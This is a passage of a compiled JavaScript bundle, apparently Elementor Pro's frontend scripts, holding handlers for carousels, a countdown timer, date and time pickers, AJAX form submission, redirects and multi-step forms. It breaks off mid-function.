
    return super.getSlidesPerView(device);
  }

  getSwiperOptions() {
    const options = super.getSwiperOptions();

    if (this.isSlideshow()) {
      options.loopedSlides = this.getSlidesCount();
      delete options.pagination;
      delete options.breakpoints;
    }

    return options;
  }

  async onInit() {
    await super.onInit();
    const slidesCount = this.getSlidesCount();

    if (!this.isSlideshow() || 1 >= slidesCount) {
      return;
    }

    const elementSettings = this.getElementSettings(),
          loop = 'yes' === elementSettings.loop,
          breakpointsSettings = {},
          breakpoints = elementorFrontend.config.responsive.activeBreakpoints,
          desktopSlidesPerView = this.getDeviceSlidesPerView('desktop');
    Object.keys(breakpoints).forEach(breakpointName => {
      breakpointsSettings[breakpoints[breakpointName].value] = {
        slidesPerView: this.getDeviceSlidesPerView(breakpointName),
        spaceBetween: this.getSpaceBetween(breakpointName)
      };
    });
    const thumbsSliderOptions = {
      slidesPerView: desktopSlidesPerView,
      initialSlide: this.getInitialSlide(),
      centeredSlides: elementSettings.centered_slides,
      slideToClickedSlide: true,
      spaceBetween: this.getSpaceBetween(),
      loopedSlides: slidesCount,
      loop,
      breakpoints: breakpointsSettings,
      handleElementorBreakpoints: true
    };
    const Swiper = elementorFrontend.utils.swiper;
    this.swiper.controller.control = this.thumbsSwiper = await new Swiper(this.elements.$thumbsSwiper, thumbsSliderOptions); // Expose the swiper instance in the frontend

    this.elements.$thumbsSwiper.data('swiper', this.thumbsSwiper);
    this.thumbsSwiper.controller.control = this.swiper;
  }

}

exports.default = MediaCarousel;

/***/ }),

/***/ "../modules/carousel/assets/js/frontend/handlers/testimonial-carousel.js":
/*!*******************************************************************************!*\
  !*** ../modules/carousel/assets/js/frontend/handlers/testimonial-carousel.js ***!
  \*******************************************************************************/
/***/ ((__unused_webpack_module, exports, __webpack_require__) => {

"use strict";


var _interopRequireDefault = __webpack_require__(/*! @babel/runtime/helpers/interopRequireDefault */ "../node_modules/@babel/runtime/helpers/interopRequireDefault.js");

Object.defineProperty(exports, "__esModule", ({
  value: true
}));
exports.default = void 0;

var _base = _interopRequireDefault(__webpack_require__(/*! ./base */ "../modules/carousel/assets/js/frontend/handlers/base.js"));

class TestimonialCarousel extends _base.default {
  getDefaultSettings() {
    const defaultSettings = super.getDefaultSettings();
    defaultSettings.slidesPerView = {
      desktop: 1
    };
    Object.keys(elementorFrontend.config.responsive.activeBreakpoints).forEach(breakpointName => {
      defaultSettings.slidesPerView[breakpointName] = 1;
    });

    if (defaultSettings.loop) {
      defaultSettings.loopedSlides = this.getSlidesCount();
    }

    return defaultSettings;
  }

  getEffect() {
    return 'slide';
  }

}

exports.default = TestimonialCarousel;

/***/ }),

/***/ "../modules/countdown/assets/js/frontend/frontend-legacy.js":
/*!******************************************************************!*\
  !*** ../modules/countdown/assets/js/frontend/frontend-legacy.js ***!
  \******************************************************************/
/***/ ((__unused_webpack_module, exports, __webpack_require__) => {

"use strict";


var _interopRequireDefault = __webpack_require__(/*! @babel/runtime/helpers/interopRequireDefault */ "../node_modules/@babel/runtime/helpers/interopRequireDefault.js");

Object.defineProperty(exports, "__esModule", ({
  value: true
}));
exports.default = void 0;

var _countdown = _interopRequireDefault(__webpack_require__(/*! ./handlers/countdown */ "../modules/countdown/assets/js/frontend/handlers/countdown.js"));

class _default extends elementorModules.Module {
  constructor() {
    super();
    elementorFrontend.elementsHandler.attachHandler('countdown', _countdown.default);
  }

}

exports.default = _default;

/***/ }),

/***/ "../modules/countdown/assets/js/frontend/handlers/countdown.js":
/*!*********************************************************************!*\
  !*** ../modules/countdown/assets/js/frontend/handlers/countdown.js ***!
  \*********************************************************************/
/***/ ((__unused_webpack_module, exports) => {

"use strict";


Object.defineProperty(exports, "__esModule", ({
  value: true
}));
exports.default = void 0;

var _default = elementorModules.frontend.handlers.Base.extend({
  cache: null,

  cacheElements() {
    const $countDown = this.$element.find('.elementor-countdown-wrapper');
    this.cache = {
      $countDown,
      timeInterval: null,
      elements: {
        $countdown: $countDown.find('.elementor-countdown-wrapper'),
        $daysSpan: $countDown.find('.elementor-countdown-days'),
        $hoursSpan: $countDown.find('.elementor-countdown-hours'),
        $minutesSpan: $countDown.find('.elementor-countdown-minutes'),
        $secondsSpan: $countDown.find('.elementor-countdown-seconds'),
        $expireMessage: $countDown.parent().find('.elementor-countdown-expire--message')
      },
      data: {
        id: this.$element.data('id'),
        endTime: new Date($countDown.data('date') * 1000),
        actions: $countDown.data('expire-actions'),
        evergreenInterval: $countDown.data('evergreen-interval')
      }
    };
  },

  onInit() {
    elementorModules.frontend.handlers.Base.prototype.onInit.apply(this, arguments);
    this.cacheElements();

    if (0 < this.cache.data.evergreenInterval) {
      this.cache.data.endTime = this.getEvergreenDate();
    }

    this.initializeClock();
  },

  updateClock() {
    const self = this,
          timeRemaining = this.getTimeRemaining(this.cache.data.endTime);
    jQuery.each(timeRemaining.parts, function (timePart) {
      const $element = self.cache.elements['$' + timePart + 'Span'];
      let partValue = this.toString();

      if (1 === partValue.length) {
        partValue = 0 + partValue;
      }

      if ($element.length) {
        $element.text(partValue);
      }
    });

    if (timeRemaining.total <= 0) {
      clearInterval(this.cache.timeInterval);
      this.runActions();
    }
  },

  initializeClock() {
    const self = this;
    this.updateClock();
    this.cache.timeInterval = setInterval(function () {
      self.updateClock();
    }, 1000);
  },

  runActions() {
    const self = this; // Trigger general event for 3rd patry actions

    self.$element.trigger('countdown_expire', self.$element);

    if (!this.cache.data.actions) {
      return;
    }

    this.cache.data.actions.forEach(function (action) {
      switch (action.type) {
        case 'hide':
          self.cache.$countDown.hide();
          break;

        case 'redirect':
          if (action.redirect_url) {
            window.location.href = action.redirect_url;
          }

          break;

        case 'message':
          self.cache.elements.$expireMessage.show();
          break;
      }
    });
  },

  getTimeRemaining(endTime) {
    const timeRemaining = endTime - new Date();
    let seconds = Math.floor(timeRemaining / 1000 % 60),
        minutes = Math.floor(timeRemaining / 1000 / 60 % 60),
        hours = Math.floor(timeRemaining / (1000 * 60 * 60) % 24),
        days = Math.floor(timeRemaining / (1000 * 60 * 60 * 24));

    if (days < 0 || hours < 0 || minutes < 0) {
      seconds = minutes = hours = days = 0;
    }

    return {
      total: timeRemaining,
      parts: {
        days,
        hours,
        minutes,
        seconds
      }
    };
  },

  getEvergreenDate() {
    const self = this,
          id = this.cache.data.id,
          interval = this.cache.data.evergreenInterval,
          dueDateKey = id + '-evergreen_due_date',
          intervalKey = id + '-evergreen_interval',
          localData = {
      dueDate: localStorage.getItem(dueDateKey),
      interval: localStorage.getItem(intervalKey)
    },
          initEvergreen = function () {
      var evergreenDueDate = new Date();
      self.cache.data.endTime = evergreenDueDate.setSeconds(evergreenDueDate.getSeconds() + interval);
      localStorage.setItem(dueDateKey, self.cache.data.endTime);
      localStorage.setItem(intervalKey, interval);
      return self.cache.data.endTime;
    };

    if (null === localData.dueDate && null === localData.interval) {
      return initEvergreen();
    }

    if (null !== localData.dueDate && interval !== parseInt(localData.interval, 10)) {
      return initEvergreen();
    }

    if (localData.dueDate > 0 && parseInt(localData.interval, 10) === interval) {
      return localData.dueDate;
    }
  }

});

exports.default = _default;

/***/ }),

/***/ "../modules/forms/assets/js/frontend/frontend-legacy.js":
/*!**************************************************************!*\
  !*** ../modules/forms/assets/js/frontend/frontend-legacy.js ***!
  \**************************************************************/
/***/ ((__unused_webpack_module, exports, __webpack_require__) => {

"use strict";


var _interopRequireDefault = __webpack_require__(/*! @babel/runtime/helpers/interopRequireDefault */ "../node_modules/@babel/runtime/helpers/interopRequireDefault.js");

Object.defineProperty(exports, "__esModule", ({
  value: true
}));
exports.default = void 0;

var _formSteps = _interopRequireDefault(__webpack_require__(/*! ./handlers/form-steps */ "../modules/forms/assets/js/frontend/handlers/form-steps.js"));

var _formSender = _interopRequireDefault(__webpack_require__(/*! ./handlers/form-sender */ "../modules/forms/assets/js/frontend/handlers/form-sender.js"));

var _formRedirect = _interopRequireDefault(__webpack_require__(/*! ./handlers/form-redirect */ "../modules/forms/assets/js/frontend/handlers/form-redirect.js"));

var _recaptcha = _interopRequireDefault(__webpack_require__(/*! ./handlers/recaptcha */ "../modules/forms/assets/js/frontend/handlers/recaptcha.js"));

var _date = _interopRequireDefault(__webpack_require__(/*! ./handlers/fields/date */ "../modules/forms/assets/js/frontend/handlers/fields/date.js"));

var _time = _interopRequireDefault(__webpack_require__(/*! ./handlers/fields/time */ "../modules/forms/assets/js/frontend/handlers/fields/time.js"));

class _default extends elementorModules.Module {
  constructor() {
    super();
    const formHandlers = [_formSteps.default, _formSender.default, _formRedirect.default];
    elementorFrontend.elementsHandler.attachHandler('form', [...formHandlers, _recaptcha.default, _date.default, _time.default]);
    elementorFrontend.elementsHandler.attachHandler('subscribe', formHandlers);
  }

}

exports.default = _default;

/***/ }),

/***/ "../modules/forms/assets/js/frontend/handlers/fields/data-time-field-base.js":
/*!***********************************************************************************!*\
  !*** ../modules/forms/assets/js/frontend/handlers/fields/data-time-field-base.js ***!
  \***********************************************************************************/
/***/ ((__unused_webpack_module, exports) => {

"use strict";


Object.defineProperty(exports, "__esModule", ({
  value: true
}));
exports.default = void 0;

class DataTimeFieldBase extends elementorModules.frontend.handlers.Base {
  getDefaultSettings() {
    return {
      selectors: {
        fields: this.getFieldsSelector()
      },
      classes: {
        useNative: 'elementor-use-native'
      }
    };
  }

  getDefaultElements() {
    const {
      selectors
    } = this.getDefaultSettings();
    return {
      $fields: this.$element.find(selectors.fields)
    };
  }

  addPicker(element) {
    const {
      classes
    } = this.getDefaultSettings(),
          $element = jQuery(element);

    if ($element.hasClass(classes.useNative)) {
      return;
    }

    element.flatpickr(this.getPickerOptions(element));
  }

  onInit(...args) {
    super.onInit(...args);
    this.elements.$fields.each((index, element) => this.addPicker(element));
  }

}

exports.default = DataTimeFieldBase;

/***/ }),

/***/ "../modules/forms/assets/js/frontend/handlers/fields/date.js":
/*!*******************************************************************!*\
  !*** ../modules/forms/assets/js/frontend/handlers/fields/date.js ***!
  \*******************************************************************/
/***/ ((__unused_webpack_module, exports, __webpack_require__) => {

"use strict";


var _interopRequireDefault = __webpack_require__(/*! @babel/runtime/helpers/interopRequireDefault */ "../node_modules/@babel/runtime/helpers/interopRequireDefault.js");

Object.defineProperty(exports, "__esModule", ({
  value: true
}));
exports.default = void 0;

var _dataTimeFieldBase = _interopRequireDefault(__webpack_require__(/*! ./data-time-field-base */ "../modules/forms/assets/js/frontend/handlers/fields/data-time-field-base.js"));

class DateField extends _dataTimeFieldBase.default {
  getFieldsSelector() {
    return '.elementor-date-field';
  }

  getPickerOptions(element) {
    const $element = jQuery(element);
    return {
      minDate: $element.attr('min') || null,
      maxDate: $element.attr('max') || null,
      allowInput: true
    };
  }

}

exports.default = DateField;

/***/ }),

/***/ "../modules/forms/assets/js/frontend/handlers/fields/time.js":
/*!*******************************************************************!*\
  !*** ../modules/forms/assets/js/frontend/handlers/fields/time.js ***!
  \*******************************************************************/
/***/ ((__unused_webpack_module, exports, __webpack_require__) => {

"use strict";


var _interopRequireDefault = __webpack_require__(/*! @babel/runtime/helpers/interopRequireDefault */ "../node_modules/@babel/runtime/helpers/interopRequireDefault.js");

Object.defineProperty(exports, "__esModule", ({
  value: true
}));
exports.default = void 0;

var _dataTimeFieldBase = _interopRequireDefault(__webpack_require__(/*! ./data-time-field-base */ "../modules/forms/assets/js/frontend/handlers/fields/data-time-field-base.js"));

class TimeField extends _dataTimeFieldBase.default {
  getFieldsSelector() {
    return '.elementor-time-field';
  }

  getPickerOptions() {
    return {
      noCalendar: true,
      enableTime: true,
      allowInput: true
    };
  }

}

exports.default = TimeField;

/***/ }),

/***/ "../modules/forms/assets/js/frontend/handlers/form-redirect.js":
/*!*********************************************************************!*\
  !*** ../modules/forms/assets/js/frontend/handlers/form-redirect.js ***!
  \*********************************************************************/
/***/ ((__unused_webpack_module, exports) => {

"use strict";


Object.defineProperty(exports, "__esModule", ({
  value: true
}));
exports.default = void 0;

var _default = elementorModules.frontend.handlers.Base.extend({
  getDefaultSettings() {
    return {
      selectors: {
        form: '.elementor-form'
      }
    };
  },

  getDefaultElements() {
    var selectors = this.getSettings('selectors'),
        elements = {};
    elements.$form = this.$element.find(selectors.form);
    return elements;
  },

  bindEvents() {
    this.elements.$form.on('form_destruct', this.handleSubmit);
  },

  handleSubmit(event, response) {
    if ('undefined' !== typeof response.data.redirect_url) {
      location.href = response.data.redirect_url;
    }
  }

});

exports.default = _default;

/***/ }),

/***/ "../modules/forms/assets/js/frontend/handlers/form-sender.js":
/*!*******************************************************************!*\
  !*** ../modules/forms/assets/js/frontend/handlers/form-sender.js ***!
  \*******************************************************************/
/***/ ((__unused_webpack_module, exports) => {

"use strict";


Object.defineProperty(exports, "__esModule", ({
  value: true
}));
exports.default = void 0;

var _default = elementorModules.frontend.handlers.Base.extend({
  getDefaultSettings() {
    return {
      selectors: {
        form: '.elementor-form',
        submitButton: '[type="submit"]'
      },
      action: 'elementor_pro_forms_send_form',
      ajaxUrl: elementorProFrontend.config.ajaxurl
    };
  },

  getDefaultElements() {
    const selectors = this.getSettings('selectors'),
          elements = {};
    elements.$form = this.$element.find(selectors.form);
    elements.$submitButton = elements.$form.find(selectors.submitButton);
    return elements;
  },

  bindEvents() {
    this.elements.$form.on('submit', this.handleSubmit);
    const $fileInput = this.elements.$form.find('input[type=file]');

    if ($fileInput.length) {
      $fileInput.on('change', this.validateFileSize);
    }
  },

  validateFileSize(event) {
    const $field = jQuery(event.currentTarget),
          files = $field[0].files;

    if (!files.length) {
      return;
    }

    const maxSize = parseInt($field.attr('data-maxsize')) * 1024 * 1024,
          maxSizeMessage = $field.attr('data-maxsize-message');
    const filesArray = Array.prototype.slice.call(files);
    filesArray.forEach(file => {
      if (maxSize < file.size) {
        $field.parent().addClass('elementor-error').append('<span class="elementor-message elementor-message-danger elementor-help-inline elementor-form-help-inline" role="alert">' + maxSizeMessage + '</span>').find(':input').attr('aria-invalid', 'true');
        this.elements.$form.trigger('error');
      }
    });
  },

  beforeSend() {
    const $form = this.elements.$form;
    $form.animate({
      opacity: '0.45'
    }, 500).addClass('elementor-form-waiting');
    $form.find('.elementor-message').remove();
    $form.find('.elementor-error').removeClass('elementor-error');
    $form.find('div.elementor-field-group').removeClass('error').find('span.elementor-form-help-inline').remove().end().find(':input').attr('aria-invalid', 'false');
    this.elements.$submitButton.attr('disabled', 'disabled').find('> span').prepend('<span class="elementor-button-text elementor-form-spinner"><i class="fa fa-spinner fa-spin"></i>&nbsp;</span>');
  },

  getFormData() {
    const formData = new FormData(this.elements.$form[0]);
    formData.append('action', this.getSettings('action'));
    formData.append('referrer', location.toString());
    return formData;
  },

  onSuccess(response) {
    const $form = this.elements.$form;
    this.elements.$submitButton.removeAttr('disabled').find('.elementor-form-spinner').remove();
    $form.animate({
      opacity: '1'
    }, 100).removeClass('elementor-form-waiting');

    if (!response.success) {
      if (response.data.errors) {
        jQuery.each(response.data.errors, function (key, title) {
          $form.find('#form-field-' + key).parent().addClass('elementor-error').append('<span class="elementor-message elementor-message-danger elementor-help-inline elementor-form-help-inline" role="alert">' + title + '</span>').find(':input').attr('aria-invalid', 'true');
        });
        $form.trigger('error');
      }

      $form.append('<div class="elementor-message elementor-message-danger" role="alert">' + response.data.message + '</div>');
    } else {
      $form.trigger('submit_success', response.data); // For actions like redirect page

      $form.trigger('form_destruct', response.data);
      $form.trigger('reset');

      if ('undefined' !== typeof response.data.message && '' !== response.data.message) {
        $form.append('<div class="elementor-message elementor-message-success" role="alert">' + response.data.message + '</div>');
      }
    }
  },

  onError(xhr, desc) {
    const $form = this.elements.$form;
    $form.append('<div class="elementor-message elementor-message-danger" role="alert">' + desc + '</div>');
    this.elements.$submitButton.html(this.elements.$submitButton.text()).removeAttr('disabled');
    $form.animate({
      opacity: '1'
    }, 100).removeClass('elementor-form-waiting');
    $form.trigger('error');
  },

  handleSubmit(event) {
    const self = this,
          $form = this.elements.$form;
    event.preventDefault();

    if ($form.hasClass('elementor-form-waiting')) {
      return false;
    }

    this.beforeSend();
    jQuery.ajax({
      url: self.getSettings('ajaxUrl'),
      type: 'POST',
      dataType: 'json',
      data: self.getFormData(),
      processData: false,
      contentType: false,
      success: self.onSuccess,
      error: self.onError
    });
  }

});

exports.default = _default;

/***/ }),

/***/ "../modules/forms/assets/js/frontend/handlers/form-steps.js":
/*!******************************************************************!*\
  !*** ../modules/forms/assets/js/frontend/handlers/form-steps.js ***!
  \******************************************************************/
/***/ ((__unused_webpack_module, exports) => {

"use strict";


Object.defineProperty(exports, "__esModule", ({
  value: true
}));
exports.default = void 0;

class FormSteps extends elementorModules.frontend.handlers.Base {
  getDefaultSettings() {
    return {
      selectors: {
        form: '.elementor-form',
        fieldsWrapper: '.elementor-form-fields-wrapper',
        fieldGroup: '.elementor-field-group',
        stepWrapper: '.elementor-field-type-step',
        stepField: '.e-field-step',
        submitWrapper: '.elementor-field-type-submit',
        submitButton: '[type="submit"]',
        buttons: '.e-form__buttons',
        buttonWrapper: '.e-form__buttons__wrapper',
        button: '.e-form__buttons__wrapper__button',
        indicator: '.e-form__indicators__indicator',
        indicatorProgress: '.e-form__indicators__indicator__progress',
        indicatorProgressMeter: '.e-form__indicators__indicator__progress__meter',
        formHelpInline: '.elementor-form-help-inline'
      },
      classes: {
        hidden: 'elementor-hidden',
        column: 'elementor-column',
        fieldGroup: 'elementor-field-group',
        elementorButton: 'elementor-button',
        step: 'e-form__step',
        buttons: 'e-form__buttons',
        buttonWrapper: 'e-form__buttons__wrapper',
        button: 'e-form__buttons__wrapper__button',
        indicators: 'e-form__indicators',
        indicator: 'e-form__indicators__indicator',
        indicatorIcon: 'e-form__indicators__indicator__icon',
        indicatorNumber: 'e-form__indicators__indicator__number',
        indicatorLabel: 'e-form__indicators__indicator__label',
        indicatorProgress: 'e-form__indicators__indicator__progress',
        indicatorProgressMeter: 'e-form__indicators__indicator__progress__meter',
        indicatorSeparator: 'e-form__indicators__indicator__separator',
        indicatorInactive: 'e-form__indicators__indicator--state-inactive',
        indicatorActive: 'e-form__indicators__indicator--state-active',
        indicatorCompleted: 'e-form__indicators__indicator--state-completed',
        indicatorShapeCircle: 'e-form__indicators__indicator--shape-circle',
        indicatorShapeSquare: 'e-form__indicators__indicator--shape-square',
        indicatorShapeRounded: 'e-form__indicators__indicator--shape-rounded',
        indicatorShapeNone: 'e-form__indicators__indicator--shape-none'
      }
    };
  }

  getDefaultElements() {
    const {
      selectors
    } = this.getSettings(),
          elements = {
      $form: this.$element.find(selectors.form)
    };
    elements.$fieldsWrapper = elements.$form.children(selectors.fieldsWrapper);
    elements.$stepWrapper = elements.$fieldsWrapper.children(selectors.stepWrapper);
    elements.$stepField = elements.$stepWrapper.children(selectors.stepField);
    elements.$fieldGroup = elements.$fieldsWrapper.children(selectors.fieldGroup);
    elements.$submitWrapper = elements.$fieldsWrapper.children(selectors.submitWrapper);
    elements.$submitButton = elements.$submitWrapper.children(selectors.submitButton);
    return elements;
  }

  onInit(...args) {
    super.onInit(...args);

    if (!this.isStepsExist()) {
      return;
    }

    this.data = {
      steps: [],
      indicatorsWithObjectTags: []
    };
    this.state = {
      currentStep: 0,
      stepsType: '',
      stepsShape: ''
    };
    this.buildSteps();
    this.elements = { ...this.elements,
      ...this.createStepsIndicators(),
      ...this.createStepsButtons()
    };
    this.initProgressBar();
    this.extractResponsiveSizeFromSubmitWrapper();
  }

  bindEvents() {
    if (!this.isStepsExist()) {
      return;
    }

    this.elements.$form.on({
      submit: () => this.resetForm(),
      keydown: e => {
        if (13 === e.keyCode && !this.isLastStep() && 'textarea' !== e.target.localName) {
          e.preventDefault();
          this.applyStep('next');
        }
      },
      error: () => this.onFormError()
    });
  }

  isStepsExist() {
    return this.elements.$stepWrapper.length;
  }

  initProgressBar() {
    const stepsSettings = this.getElementSettings();

    if ('progress_bar' === stepsSettings.step_type) {
      this.setProgressBar();
    }
  }

  buildSteps() {
    this.elements.$stepWrapper.each((index, el) => {
      const {
        selectors,
        classes
      } = this.getSettings(),
            $currentStep = jQuery(el);
      $currentStep.addClass(classes.step).removeClass(classes.fieldGroup, classes.column);

      if (index) {
        $currentStep.addClass(classes.hidden);
      }

      this.setStepData($currentStep.children(selectors.stepField));
      $currentStep.append($currentStep.nextUntil(this.elements.$stepWrapper).not(this.elements.$submitWrapper));
    });
  }

  setStepData($stepElement) {
    const dataAttributes = ['label', 'previousButton', 'nextButton', 'iconUrl', 'iconLibrary', 'icon'],
          stepData = {};
    dataAttributes.forEach(attr => {
      const attrValue = $stepElement.attr('data-' + attr);

      if (attrValue) {
        stepData[attr] = attrValue;
      }
    });
    this.data.steps.push(stepData);
  }

  createStepsIndicators() {
    const stepsSettings = this.getElementSettings(),
          stepsElements = {};

    if ('none' !== stepsSettings.step_type) {
      const {
        selectors,
        classes
      } = this.getSettings(),
            indicatorsTypeClass = classes.indicators + '--type-' + stepsSettings.step_type,
            indicatorsClasses = [classes.indicators, indicatorsTypeClass];
      stepsElements.$indicatorsWrapper = jQuery('<div>', {
        class: indicatorsClasses.join(' ')
      });
      stepsElements.$indicatorsWrapper.append(this.buildIndicators());
      this.elements.$fieldsWrapper.before(stepsElements.$indicatorsWrapper);

      if ('progress_bar' === stepsSettings.step_type) {
        stepsElements.$progressBar = stepsElements.$indicatorsWrapper.find(selectors.indicatorProgress);
        stepsElements.$progressBarMeter = stepsElements.$indicatorsWrapper.find(selectors.indicatorProgressMeter);
      } else {
        stepsElements.$indicators = stepsElements.$indicatorsWrapper.find(selectors.indicator);
        stepsElements.$currentIndicator = stepsElements.$indicators.eq(this.state.currentStep);
      }
    }

    this.saveIndicatorsState();
    return stepsElements;
  }

  buildIndicators() {
    const stepsSettings = this.getElementSettings();
    return 'progress_bar' === stepsSettings.step_type ? this.buildProgressBar() : this.buildIndicatorsFromStepsData();
  }

  buildProgressBar() {
    const {
      classes
    } = this.getSettings(),
          $progressBar = jQuery('<div>', {
      class: classes.indicatorProgress
    }),
          $progressBarMeter = jQuery('<div>', {
      class: classes.indicatorProgressMeter
    });
    $progressBar.append($progressBarMeter);
    return $progressBar;
  }

  getProgressBarValue() {
    const totalSteps = this.data.steps.length,
          currentStep = this.state.currentStep,
          percentage = currentStep ? (currentStep + 1) / totalSteps * 100 : 100 / totalSteps;
    return Math.floor(percentage) + '%';
  }

  setProgressBar() {
    const progressBarValue = this.getProgressBarValue();
    this.updateProgressMeterCSSVariable(progressBarValue);
    this.elements.$progressBarMeter.text(progressBarValue);
  }

  updateProgressMeterCSSVariable(value) {
    this.$element[0].style.setProperty('--e-form-steps-indicator-progress-meter-width', value);
  }

  saveIndicatorsState() {
    const stepsSettings = this.getElementSettings();
    this.state.stepsType = stepsSettings.step_type;

    if (!['none', 'text', 'progress_bar'].includes(stepsSettings.step_type)) {
      this.state.stepsShape = stepsSettings.step_icon_shape;
    }
  }

  buildIndicatorsFromStepsData() {
    const indicators = [];
    this.data.steps.forEach((stepObj, index) => {
      if (index) {
        indicators.push(this.getStepSeparator());
      }

      indicators.push(this.getStepIndicatorElement(stepObj, index));
    });
    return indicators;
  }

  getStepIndicatorElement(stepObj, index) {
    const {
      classes
    } = this.getSettings(),
          stepsSettings = this.getElementSettings(),
          indicatorStateClass = this.getIndicatorStateClass(index),
          indicatorClasses = [classes.indicator, indicatorStateClass],
          $stepIndicator = jQuery('<div>', {
      class: indicatorClasses.join(' ')
    });

    if (stepsSettings.step_type.includes('icon')) {
      $stepIndicator.append(this.getStepIconElement(stepObj));
    }

    if (stepsSettings.step_type.includes('number')) {
      $stepIndicator.append(this.getStepNumberElement(index));
    }

    if (stepsSettings.step_type.includes('text')) {
      $stepIndicator.append(this.getStepLabelElement(stepObj.label));
    }

    return $stepIndicator;
  }

  getIndicatorStateClass(index) {
    const {
      classes
    } = this.getSettings();

    if (index < this.state.currentStep) {
      return classes.indicatorCompleted;
    } else if (index > this.state.currentStep) {
      return classes.indicatorInactive;
    }

    return classes.indicatorActive;
  }

  getIndicatorShapeClass() {
    const stepsSettings = this.getElementSettings(),
          {
      classes
    } = this.getSettings();
    return classes['indicatorShape' + this.firstLetterToUppercase(stepsSettings.step_icon_shape)];
  }

  firstLetterToUppercase(str) {
    return str.charAt(0).toUpperCase() + str.slice(1);
  }

  getStepNumberElement(index) {
    const {
      classes
    } = this.getSettings(),
          numberClasses = [classes.indicatorNumber, this.getIndicatorShapeClass()];
    return jQuery('<div>', {
      class: numberClasses.join(' '),
      text: index + 1
    });
  }

  getStepIconElement(stepObj) {
    const {
      classes
    } = this.getSettings(),
          iconClasses = [classes.indicatorIcon, this.getIndicatorShapeClass()],
          $icon = jQuery('<div>', {
      class: iconClasses.join(' ')
    });

    if (stepObj.icon) {
      $icon.html(stepObj.icon);
    } else {
      let $iconElement;

      if (stepObj.iconLibrary) {
        $iconElement = jQuery('<i>', {
          class: stepObj.iconLibrary
        });
      } else {
        // Using the attributes inline when creating the object, otherwise the data attribute will not work.
        $iconElement = jQuery(`<object type="image/svg+xml" data="${stepObj.iconUrl}"></object>`); // Updating an indicator svg fill color, when loaded inside an object tag with a separated scope.

        $iconElement.on('load', event => {
          event.target.contentDocument.querySelector('svg').style.fill = $iconElement.css('fill');
        }); // Storing the indicators elements that contain object tags in order to change their fill color on steps change.

        this.data.indicatorsWithObjectTags.push($iconElement);
      }

      $icon.append($iconElement);
    }

    return $icon;
  }

  getStepLabelElement(label) {
    const {
      classes
    } = this.getSettings();
    return jQuery('<label>', {
      class: classes.indicatorLabel,
      text: label
    });
  }

  getStepSeparator() {
    const {
      classes
    } = this.getSettings();
    return jQuery('<div>', {
      class: classes.indicatorSeparator
    });
  }

  createStepsButtons() {
    const {
      selectors
    } = this.getSettings(),
          stepsElements = {};
    this.injectButtonsToSteps(stepsElements);
    stepsElements.$buttonsContainer = this.elements.$stepWrapper.find(selectors.buttons);
    stepsElements.$buttonsWrappers = stepsElements.$buttonsContainer.children(selectors.buttonWrapper);
    return stepsElements;
  }

  injectButtonsToSteps() {
    const totalSteps = this.elements.$stepWrapper.length;
    this.elements.$stepWrapper.each((index, el) => {
      const $el = jQuery(el),
            $container = this.getButtonsContainer();
      let $nextButton;

      if (index) {
        $container.append(this.getStepButton('previous', index));
        $nextButton = index === totalSteps - 1 ? this.getSubmitButton() : this.getStepButton('next', index);
      } else {
        $nextButton = this.getStepButton('next', index);
      }

      $container.append($nextButton);
      $el.append($container);
    });
  }

  getButtonsContainer() {
    const {
      classes
    } = this.getSettings(),
          stepsSettings = this.getElementSettings(),
          buttonColumnWidthClasses = [classes.buttons, classes.column, 'elementor-col-' + stepsSettings.button_width];
    return jQuery('<div>', {
      class: buttonColumnWidthClasses.join(' ')
    });
  }

  extractResponsiveSizeFromSubmitWrapper() {
    let sizeClasses = [];
    this.elements.$submitWrapper.removeClass((index, className) => {
      var _className$match;

      sizeClasses = (_className$match = className.match(/elementor-(sm|md)-[0-9]+/g)) === null || _className$match === void 0 ? void 0 : _className$match.join(' ');
      return sizeClasses;
    });
    this.elements.$buttonsContainer.addClass(sizeClasses);
  }

  getStepButton(buttonType, index) {
    const {
      classes
    } = this.getSettings(),
          $button = this.getButton(buttonType, index).on('click', () => this.applyStep(buttonType)),
          buttonWrapperClasses = [classes.fieldGroup, classes.buttonWrapper, 'elementor-field-type-' + buttonType];
    return jQuery('<div>', {
      class: buttonWrapperClasses.join(' ')
    }).append($button);
  }

  getSubmitButton() {
    const {
      classes
    } = this.getSettings();
    this.elements.$submitButton.addClass(classes.button); // TODO: When a solution for the conditions will be found, check if can remove the elementor-col-x manipulation.

    return this.elements.$submitWrapper.attr('class', (index, className) => {
      return this.replaceClassNameColSize(className, '');
    }).removeClass(classes.column).removeClass(classes.buttons).addClass(classes.buttonWrapper);
  }

  replaceClassNameColSize(className, value) {
    return className.replace(/elementor-col-([0-9]+)/g, value);
  }

  getButton(buttonType, index) {
    const {
      classes
    } = this.getSettings(),
          submitSizeClass = this.elements.$submitButton.attr('class').match(/elementor-size-([^\W\d]+)/g),
          buttonClasses = [classes.elementorButton, submitSizeClass, classes.button, classes.button + '-' + buttonType];
    return jQuery('<button>', {
      type: 'button',
      text: this.getButtonLabel(buttonType, index),
      class: buttonClasses.join(' ')
    });
  }

  getButtonLabel(buttonType, index) {
    const stepsSettings = this.getElementSettings(),
          stepData = this.data.steps[index],
          buttonName = buttonType + 'Button',
          buttonSettingsProp = `step_${buttonType}_label`;
    return stepData[buttonName] || stepsSettings[buttonSettingsProp];
  }

  applyStep(direction) {
    const nextIndex = 'next' === direction ? this.state.currentStep + 1 : this.state.currentStep - 1;

    if ('next' === direction && !this.isFieldsValid(this.elements.$stepWrapper)) {
      return false;
    }

    this.goToStep(nextIndex);
    this.state.currentStep = nextIndex;

    if ('progress_bar' === this.state.stepsType) {
      this.setProgressBar();
    } else if ('none' !== this.state.stepsType) {
      this.updateIndicatorsState(direction);
    }
  }

  goToStep(index) {
    const {
      classes
    } = this.getSettings();
    this.elements.$stepWrapper.eq(this.state.currentStep).addClass(classes.hidden);
    this.elements.$stepWrapper.eq(index).removeClass(classes.hidden).children(this.getSettings('selectors.fieldGroup')).first().find(':input').first().trigger('focus');
  }

  isFieldsValid($stepWrapper) {
    let isValid = true;
    $stepWrapper.eq(this.state.currentStep).find('.elementor-field-group :input').each((index, el) => {
      if (!el.checkValidity()) {
        el.reportValidity();
        return isValid = false;
      }
    });
    return isValid;
  }

  isLastStep() {
    return this.state.currentStep === this.data.steps.length - 1;
  }

  resetForm() {
    this.state.currentStep = 0;
    this.resetSteps();

    if ('progress_bar' === this.state.stepsType) {
      this.setProgressBar();
    } else if ('none' !== this.state.stepsType) {
      this.elements.$currentIndicator = this.elements.$indicators.eq(this.state.currentStep);
      this.resetIndicators();
    }
  }

  resetSteps() {
    const {
      classes
    } = this.getSettings();
